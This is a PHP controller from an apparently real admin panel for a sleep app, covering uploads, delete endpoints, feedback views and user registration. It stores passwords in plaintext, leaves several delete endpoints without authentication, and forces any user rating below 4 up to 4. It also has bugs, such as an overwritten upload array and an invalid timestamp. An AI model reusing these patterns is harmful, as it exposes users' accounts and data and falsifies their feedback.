        if (empty($_FILES["video"]['name']) == false) {
        
            $imagePrefix = time();
    		$ext = pathinfo($_FILES["video"]['name'], PATHINFO_EXTENSION);
    		$file_name = 'intro_file_' . $imagePrefix . '.' . $ext;
    		$config['upload_path'] = './uploads/video/';
    		$config['max_size']         = '';
    		$config['max_width']        = '';
    		$config['max_height']       = '';
    		$config['allowed_types'] = 'mp4';
    		$config['overwrite'] = TRUE;
    		$config['file_ext_tolower'] = TRUE;
    		$config['file_name'] = $file_name;
    			
    		$this->load->library('upload', $config);
    		$this->upload->initialize($config);
    			
    		if (!$this->upload->do_upload('video')) {
    			$error = array('error' => $this->upload->display_errors());
    			$errorFlag = 1;
    		} else {
    			$data = array('upload_data' => $this->upload->data());
    			$uploadArr["video_file_name"] = $data['upload_data']['file_name'];
    			$errorFlag = 0;
    		}
    		
        }
			
		if ($errorFlag == 0) {
		    $uploadArr = [
                'visible_file_name' => $_POST["visible_file_name"],
                'language_id' => $_POST["language_id"],
            ];
            if ($this->AdminModel->editVideoMgmt($_POST["query"], $uploadArr, $_POST["id"])) {
                $_SESSION['videoStatus'] = 1;
            } else {
                $_SESSION['videoStatus'] = 0;
            }
        } else {
            $_SESSION['videoStatus'] = 0;
        }

        redirect('videoManagement');
    }

    public function addVideo() {
        $imagePrefix = time();
			$ext = pathinfo($_FILES["video"]['name'], PATHINFO_EXTENSION);
			$file_name = 'intro_file_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('video')) {
				$error = array('error' => $this->upload->display_errors());
				$errorFlag = 1;
			} else {
				$data = array('upload_data' => $this->upload->data());
				$fileName = $data['upload_data']['file_name'];
				$errorFlag = 0;
			}

            if ($errorFlag == 0) {
                $uploadArr = [
                    'video_file_name' => $fileName, 
                    'visible_file_name' => $_POST['visible_file_name'],
                    "language_id" => $_POST["language_id"]
                ];
                if ($this->AdminModel->uploadVideo($_POST['filterFor'], $uploadArr)) {
                    $_SESSION['videoStatus'] = 1;
                } else {
                    $_SESSION['videoStatus'] = 0;
                }
            } else {
                $_SESSION['videoStatus'] = 0;
            }

            redirect('videoManagement');
    }

    public function deactiveVideo() {
        if ($this->AdminModel->deactiveVideo($_POST['id'], $_POST['query'])) {
            $response['status'] = 1;
        } else {
            $response['status'] = 0;
        }
        echo json_encode($response);
    }

    public function activeVideo() {
        if ($this->AdminModel->activeVideo($_POST['id'], $_POST['query'])) {
            $response['status'] = 1;
        } else {
            $response['status'] = 0;
        }
        echo json_encode($response);
    }
    
    
    // programManagement delete
    public function programemanagement() {
        $this->AdminModel->programdeletemanagement($_POST['id'],$_POST['filterFor']);
    }
    
    public function get_program_data_edit() {
        $data['data'] = $this->AdminModel->getProgramsFilter_edit($_POST['filter'], $_POST['id']);
        $data['status'] = 1;
        echo json_encode($data);
    }

    public function programManagement() {
        $this->checkAuth();

        if (isset($_GET['filterFor'])) {

            $data['data'] = $this->AdminModel->getProgramsFilter($_GET['filterFor']);

        } else {
            $data['data'] = false;
        }

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('programManagement', $data);
        $this->load->view('commons/footer');
    }
    
    public function save_editProgram() {
        
        if (isset($_FILES["programFile"]['name'])) {
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["programFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'program' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('programFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
				
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$data_upload['thumb'] = 'http://app.dialupdelta.com/uploads/thumb/'.$data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}
        }
        
        
        
        $data_upload['program_name'] = $_POST['programName'];
        if ($this->AdminModel->editProgram($data_upload, $_POST['filter'], $_POST['id'])) {
            $_SESSION['programStatus'] = 1;
        } else {
            $_SESSION['programStatus'] = 0;
        }

        redirect('programManagement');
        
    }

    public function addProgram() {
        
        $imagePrefix1 = time();
			$ext = pathinfo($_FILES["program_thumb"]['name'], PATHINFO_EXTENSION);
			$file_name = 'program' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('program_thumb')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$thumbFileName = 'http://app.dialupdelta.com/uploads/thumb/'.$data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}
        
        if ($this->AdminModel->addProgram($thumbFileName, $_POST['program_name'], $_POST['filterFor'])) {
            $_SESSION['programStatus'] = 1;
        } else {
            $_SESSION['programStatus'] = 0;
        }

        redirect('programManagement');
    }

    public function addUserRating() {
        
        if (intval($_POST['rating']) < 4) {
            
            $_POST["rating"] = 4;
        }
        
        $insertArr = array(
            "feedback_id" => $_POST['feedback_id'],
            "user_id" => $_POST['user_id'],
            "feedback" => $_POST['feedback'],
            "rating" => $_POST['rating']
        );
        
        if ($this->AdminModel->addUserRating($insertArr)) {
            // $request->session()->flash('success', 'User rating submitted successfully.');
            redirect("userFeedback?userID=".$_POST['user_id']);
        }
    }
    
    public function deletedurations_master() {
        $this->AdminModel->delete_duration_Row($_POST['id']);
    }
    
    public function deletelanguages_master() {
        $this->AdminModel->delete_languages_Row($_POST['id']);
    }
    public function deletepackages_master() {
        $this->AdminModel->delete_packages_Row($_POST['id']);
    }
    public function delete_sleep_enhancer_master() {
        $this->AdminModel->delete_sleep_enhancer_Row($_POST['id']);
    }
    public function delete_get_to_sell_master() {
        $this->AdminModel->delete_get_to_sell_Row($_POST['id']);
    }

    public function delete_library_master() {
        $this->AdminModel->delete_library_Row($_POST['id']);
    }
    public function delete_wake_up_list_master() {
        $this->AdminModel->delete_wake_up_list_Row($_POST['id']);
    }
    public function delete_feedback_master() {
        $this->AdminModel->delete_feedback_Row($_POST['id']);
    }

    public function delete_videomanagement_master() {
        if ($this->AdminModel->delete_videomanagement_Row($_POST['id'], $_POST['query'])) {
            $response['status'] = true;
        } else {
            $response['status'] = false;
        }

        echo json_encode($response);
    }
    public function delete_programs_master() {
        $this->AdminModel->delete_programs_Row($_POST['id']);
    }

    public function delete_program_master() {
        if ($this->AdminModel->delete_program_Row($_POST['id'], $_POST['query'])) {
            $response['status'] = true;
        } else {
            $response['status'] = false;
        }
    }

    public function feedbackData() {
        
        
        
        $this->load->view('feedbackData');
    }
    
    public function userFeedbackHistory() {
        
        // print_r($_REQUEST);die;
        // if (isset($_GET['userID'])) {
        //     $userID = $_GET['userID'];
        //     $userData = $this->AdminModel->getUserData($userID);
            
        //     if ($userData) {
                
        //         $sleepData = $this->AdminModel->getSleepActivityData($userID);
        //         // echo"<pre>";
        //         // print_r($sleepData);die;
        //         $hypnogramData = [];
        //         $counter = 0;
        //         if ($sleepData) {
        //             foreach ($sleepData as $sleepValues) {
        //                 $sleepEnhancerData = $this->AdminModel->getSleepEnhancerDataByDate($userID, $sleepValues["sleep_time"]);
                  
        //                 if ($sleepEnhancerData) {
        //                     // $hypnogramData[$counter]["t1"] = (($sleepEnhancerData[0]['t1'] >= 30 && $sleepEnhancerData[0]['t1'] <= 60)? $sleepEnhancerData[0]['t1']:45);
        //                     // $hypnogramData[$counter]["t2"] = (($sleepEnhancerData[0]['t2'] >= 120 && $sleepEnhancerData[0]['t2'] <= 150)? $sleepEnhancerData[0]['t2']:135);
        //                     $hypnogramData[$counter]["id"] =  $sleepEnhancerData[0]['id'];
        //                     $hypnogramData[$counter]["t1"] =  $sleepEnhancerData[0]['t1'];
        //                     $hypnogramData[$counter]["t2"] =  $sleepEnhancerData[0]['t2'];
        //                      $hypnogramData[$counter]["duration1"] = $sleepEnhancerData[0]['duration1'];
        //                       $hypnogramData[$counter]["duration2"] = $sleepEnhancerData[0]['duration2'];
        //                                   $hypnogramData[$counter]["program1"] = $this->AdminModel->getuserprogram($sleepEnhancerData[0]['program1']);
        //                 $hypnogramData[$counter]["program2"] = $this->AdminModel->getuserprogram($sleepEnhancerData[0]['program2']);
                            
        //                 } else {
        //                     $hypnogramData[$counter]["t1"] = (($sleepEnhancerData[0]['t1'] >= 30 && $sleepEnhancerData[0]['t1'] <= 60)? $sleepEnhancerData[0]['t1']:45);
        //                     $hypnogramData[$counter]["t2"] = (($sleepEnhancerData[0]['t2'] >= 120 && $sleepEnhancerData[0]['t2'] <= 150)? $sleepEnhancerData[0]['t2']:135);
        //                         $hypnogramData[$counter]["duration1"] = $sleepEnhancerData[0]['duration1'];
        //                       $hypnogramData[$counter]["duration2"] = $sleepEnhancerData[0]['duration2'];
        //                                   $hypnogramData[$counter]["program1"] = $this->AdminModel->getuserprogram($sleepEnhancerData[0]['program1']);
        //                 $hypnogramData[$counter]["program2"] = $this->AdminModel->getuserprogram($sleepEnhancerData[0]['program2']);
        //                 }
        //                 $wakeUpData = $this->AdminModel->getWakeUpSaverByDate($userID, date('Y-m-d H:i:s', strtotime($sleepValues["sleep_time"] . ' +1 day')));
        //                 if ($wakeUpData) {
        //                     $hypnogramData[$counter]["wakeUpTime"] = $wakeUpData[0]['time'];
        //                 } else {
        //                     $hypnogramData[$counter]["wakeUpTime"] = "07:00:00";    
        //                 }
        //                 $hypnogramData[$counter]["wT"] = round(40/60, 1);
        //                 $hypnogramData[$counter]["date"] = date("Y-m-d", strtotime($sleepValues["sleep_time"]));
        //                 $hypnogramData[$counter]["sleep_time"] = $sleepValues["sleep_time"];
                       
        //                   $hypnogramData[$counter]["ratting"] = $this->AdminModel->getUserRatingProgramid($hypnogramData[$counter]["id"]);
        //                     $counter++;
                
        //             }    
        //         }

        //          // echo '<pre>';print_r($hypnogramData);die();
                
               
        //         $data['userID'] = $_GET['userID'];
        //         $data["hypnogramData"] = $hypnogramData;
        //         // print_r($data);die;
        //         $this->load->view('userFeedbackHistory', $data);   
        //     }
        // }
        
        if (isset($_GET['userID'])) {
            $userID = $_GET['userID'];
            $userData = $this->AdminModel->getUserData($userID);
            
            if ($userData) {
                
                $sleepData = $this->AdminModel->getSleepActivityData($userID);
                
                if (isset($_GET["pagination"])) {
                    if ($_GET["pagination"] == "7Days") {
                        $range = date('Y-m-d', strtotime('-7 days'));
                    } else {
                        $range = date('Y-m-d', strtotime('-30 days'));
                    }
                } else {
                    $range = null;
                }
                
                
                
                $sleepEnhancerData = $this->AdminModel->getSleepEnhancerDataByDateAndUserIDForHistory($range, $_GET["userID"]);
                if ($sleepEnhancerData) {
                    
                    $hypnogramData = [];
                    $counter = 0;
                    
                    foreach ($sleepEnhancerData as $sValues) {
                        
                        
                        
                        if ($counter == 0) {
                            $sleepActivity = $this->AdminModel->getUserSleepWakeupActivity($_GET["userID"], $sValues["created_at"], date("Y-m-d", strtotime($sValues["created_at"]))." 59:59:59");    
                        } else {
                            $checkForSingleDate = date("Ymd", strtotime($sValues["created_at"]));
                            $sleepActivity = $this->AdminModel->getUserSleepWakeupActivity($_GET["userID"], $sValues["created_at"], $endTime);    
                        }
                        
                        $endTime = $sValues["created_at"];
                        
                        if ($counter != 0) {
                            
                            if ($checkForSingleDate != $checkForPrevDate) {
                                
                                
                                if ($sleepActivity) {
                                    $sleepDateTime = new DateTime($sleepActivity[0]['sleep_time']);
                                    $wakeUpTime = new DateTime($sleepDateTime->format('Y-m-d') . ' ' . $sleepActivity[0]['wake_up_time']);
                                    
                                    if ($wakeUpTime < $sleepDateTime) {
                                        $wakeUpTime->modify('+1 day');
                                    }
                                    
                                    $interval = $sleepDateTime->diff($wakeUpTime);
                                    
                                    $totalHours = $interval->h;
                                    $totalMinutes = $interval->i;
                                    
                                    $totalTimeDifference = $interval->format('%h hours %i minutes');    
                                
                                    $hypnogramData[$counter]["bedTime"] = date("d M, Y H:i:s", strtotime($sleepActivity[0]['sleep_time']));
                                    $hypnogramData[$counter]["totalSleep"] = $totalTimeDifference;
                                    
                                } else {
                                    $hypnogramData[$counter]["bedTime"] = "NA";
                                    $hypnogramData[$counter]["totalSleep"] = "NA";
                                }
                            
                                
                                $hypnogramData[$counter]["id"] = $sValues["id"];
                                $hypnogramData[$counter]["t1"] = $sValues["t_1"];
                                $hypnogramData[$counter]["t2"] = $sValues["t_2"];
                                $hypnogramData[$counter]["duration1"] = $sValues["duration_1"];
                                $hypnogramData[$counter]["duration2"] = $sValues["duration_2"];
                                
                                $program1 = $this->AdminModel->getProgramColorForSleepEnhancer($sValues["program_1"]);
                                $program2 = $this->AdminModel->getProgramColorForSleepEnhancer($sValues["program_2"]);
                                $hypnogramData[$counter]["program1"] = (($program1)? $program1[0]["color"]:"red");
                                $hypnogramData[$counter]["program2"] = (($program2)? $program2[0]["color"]:"red");
                                
                                $hypnogramData[$counter]["forDate"] = $sValues["created_at"];
                                $hypnogramData[$counter]["ratingData"] = $this->AdminModel->getUserRating($_GET['userID'], $hypnogramData[$counter]["id"]);
                                
                                $checkForPrevDate = date("Ymd", strtotime($sValues["created_at"]));
                            
                                $counter++;
                                
                                
                            }
                            
                        } else {
                            
                            
                            if ($sleepActivity) {
                                $sleepDateTime = new DateTime($sleepActivity[0]['sleep_time']);
                                $wakeUpTime = new DateTime($sleepDateTime->format('Y-m-d') . ' ' . $sleepActivity[0]['wake_up_time']);
                                
                                if ($wakeUpTime < $sleepDateTime) {
                                    $wakeUpTime->modify('+1 day');
                                }
                                
                                $interval = $sleepDateTime->diff($wakeUpTime);
                                
                                $totalHours = $interval->h;
                                $totalMinutes = $interval->i;
                                
                                $totalTimeDifference = $interval->format('%h hours %i minutes');    
                            
                                $hypnogramData[$counter]["bedTime"] = date("d M, Y H:i:s", strtotime($sleepActivity[0]['sleep_time']));
                                $hypnogramData[$counter]["totalSleep"] = $totalTimeDifference;
                                
                            } else {
                                $hypnogramData[$counter]["bedTime"] = "NA";
                                $hypnogramData[$counter]["totalSleep"] = "NA";
                            }
                        
                            
                            $hypnogramData[$counter]["id"] = $sValues["id"];
                            $hypnogramData[$counter]["t1"] = $sValues["t_1"];
                            $hypnogramData[$counter]["t2"] = $sValues["t_2"];
                            $hypnogramData[$counter]["duration1"] = $sValues["duration_1"];
                            $hypnogramData[$counter]["duration2"] = $sValues["duration_2"];
                            
                            $program1 = $this->AdminModel->getProgramColorForSleepEnhancer($sValues["program_1"]);
                            $program2 = $this->AdminModel->getProgramColorForSleepEnhancer($sValues["program_2"]);
                            $hypnogramData[$counter]["program1"] = (($program1)? $program1[0]["color"]:"red");
                            $hypnogramData[$counter]["program2"] = (($program2)? $program2[0]["color"]:"red");
                            
                            $hypnogramData[$counter]["forDate"] = $sValues["created_at"];
                            $hypnogramData[$counter]["ratingData"] = $this->AdminModel->getUserRating($_GET['userID'], $hypnogramData[$counter]["id"]);
                            
                            $checkForPrevDate = date("Ymd", strtotime($sValues["created_at"]));
                        
                            $counter++;
                            
                            
                        }
                        
                        
                    }
                    
                    $data["hypnogramData"] = $hypnogramData;
                    
                    //echo "<pre>";print_r($hypnogramData);die();
                    
                    
                } else {
                    $data["hypnogramData"] = null;
                }
                
                
                
                $data['userID'] = $_GET['userID'];
                
                //echo "<pre>";print_r($data);die();
                
                $this->load->view('userFeedbackHistory', $data);   
            }
        }
        
        
    }
    
    
    public function userFeedback() {
        if (isset($_GET['userID'])) {
            $userID = $_GET['userID'];
            $userData = $this->AdminModel->getUserData($userID);
            
            if ($userData) {
                
                $sleepData = $this->AdminModel->getSleepActivityData($userID);
                
                $sleepEnhancerData = $this->AdminModel->getSleepEnhancerDataByDateAndUserID(date("Y-m-d"), $_GET["userID"]);
                if ($sleepEnhancerData) {
                    
                    $hypnogramData = [];
                    
                    $sleepActivity = $this->AdminModel->getUserSleepWakeupActivity($_GET["userID"], date("Y-m-d", strtotime($sleepEnhancerData[0]["created_at"])), date("Y-m-d", strtotime($sleepEnhancerData[0]["created_at"]))." 59:59:59");
                    
                    if ($sleepActivity) {
                        $sleepDateTime = new DateTime($sleepActivity[0]['sleep_time']);
                        $wakeUpTime = new DateTime($sleepDateTime->format('Y-m-d') . ' ' . $sleepActivity[0]['wake_up_time']);
                        
                        if ($wakeUpTime < $sleepDateTime) {
                            $wakeUpTime->modify('+1 day');
                        }
                        
                        $interval = $sleepDateTime->diff($wakeUpTime);
                        
                        $totalHours = $interval->h;
                        $totalMinutes = $interval->i;
                        
                        $totalTimeDifference = $interval->format('%h hours %i minutes');    
                    
                        $hypnogramData["bedTime"] = date("d M, Y H:i:s", strtotime($sleepActivity[0]['sleep_time']));
                        $hypnogramData["totalSleep"] = $totalTimeDifference;
                        
                    } else {
                        $hypnogramData["bedTime"] = "NA";
                        $hypnogramData["totalSleep"] = "NA";    
                    }
                    
                    
                    $hypnogramData["id"] = $sleepEnhancerData[0]["id"];
                    $hypnogramData["t1"] = $sleepEnhancerData[0]["t_1"];
                    $hypnogramData["t2"] = $sleepEnhancerData[0]["t_2"];
                    $hypnogramData["duration1"] = $sleepEnhancerData[0]["duration_1"];
                    $hypnogramData["duration2"] = $sleepEnhancerData[0]["duration_2"];
                    $program1 = $this->AdminModel->getProgramColorForSleepEnhancer($sleepEnhancerData[0]["program_1"]);
                    $program2 = $this->AdminModel->getProgramColorForSleepEnhancer($sleepEnhancerData[0]["program_2"]);
                    $hypnogramData["program1"] = (($program1)? $program1[0]["color"]:"red");
                    $hypnogramData["program2"] = (($program2)? $program2[0]["color"]:"red");
                    
                    
                    
                    $wakeupData = $this->AdminModel->getWakeUpForFeedBack($userID, strtotime($sleepEnhancerData[0]["created_at"]));
                    
                    
                    
                    
                    $data["hypnogramData"] = $hypnogramData;
                    
                    //echo "<pre>";print_r($hypnogramData);die();
                    
                    $data['ratingData'] = $this->AdminModel->getUserRating($_GET['userID'], $hypnogramData["id"]);
                    
                } else {
                    $data["hypnogramData"] = null;
                }
                
                
                
                $data['userID'] = $_GET['userID'];
                
                //echo "<pre>";print_r($data);die();
                
                $this->load->view('userFeedback', $data);   
            }
        }
    }

    public function feedbackSingleData() {
        $this->load->view('feedbackSingleData');
    }

    public function feedbackHistory() {
        $this->load->view('feedbackHistory');
    }

    public function feedbackSuggestion() {
        $this->load->view('feedbackSuggestion');
    }
    
    
   public function register_post() {
        // Check if required fields are present in the request
        if (isset($_REQUEST['full_name'], $_REQUEST['email'], $_REQUEST['password'], $_REQUEST['language_id'], $_REQUEST['gender_id'], $_REQUEST['age_group_id'])) {

            // Check if email already exists
            if ($this->AdminModel->checkIfEmailExists($_REQUEST['email'])) {
                $response = [
                    "status" => false,
                    "msg" => "Oops!, email already exists",
                    "result" => (object) []
                ];
            } else {
                // Prepare user registration data
                $registerArr = [
                    "name" => $_REQUEST['full_name'],
                    "email" => $_REQUEST['email'],
                    "password" => $_REQUEST['password'],
                    "role" => 2, // Assuming default role for registered users
                    "gender_id" => $_REQUEST['gender_id'],
                    "age_group_id" => $_REQUEST['age_group_id'],
                    "language_id" => $_REQUEST['language_id'],
                    "createdAt" => date("Y-m-d H:i:s")
                ];

                // Attempt to register the user
                if ($status=$this->AdminModel->register_user($registerArr)) {
                    // If registration is successful
                    $response = [
                        "status" => true,
                        "msg" => "User registered successfully",
                        "result" => [
                            "id" => $status, // Assuming you retrieve the user ID from the registration process
                            "name" => $_REQUEST['full_name'],
                            "email" => $_REQUEST['email'],
                            "gender_id" => $_REQUEST['gender_id'],
                            "age_group_id" => $_REQUEST['age_group_id'],
                            "language_id" => $_REQUEST['language_id']
                        ]
                    ];
                } else {
                    // If registration fails
                    $response = [
                        "status" => false,
                        "msg" => "Oops!, something went wrong",
                        "result" => (object) []
                    ];
                }
            }

            // Return JSON response
            echo json_encode($response);
        }
    }
}
    

?>